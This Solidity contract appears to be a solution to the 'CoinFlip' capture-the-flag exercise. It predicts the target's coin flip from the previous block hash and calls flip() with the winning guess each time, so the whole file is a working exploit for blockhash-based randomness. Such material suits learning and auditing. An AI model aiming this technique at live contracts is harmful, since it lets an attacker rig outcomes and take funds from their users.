
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import './CoinFlip.sol';

contract CoinFlipToHack {

    using SafeMath for uint256;

    CoinFlip public instanceToHack;
    uint256 public FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    
    function setInstance(CoinFlip _instanceAddress) public {
        instanceToHack = CoinFlip(_instanceAddress);
    }

    
    function hackCoinFlip(bool _guess) public returns(uint256) {

        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        
        if (side == _guess) {
            instanceToHack.flip(_guess);
        
        } else {
            instanceToHack.flip(!_guess);
        }
    }

}
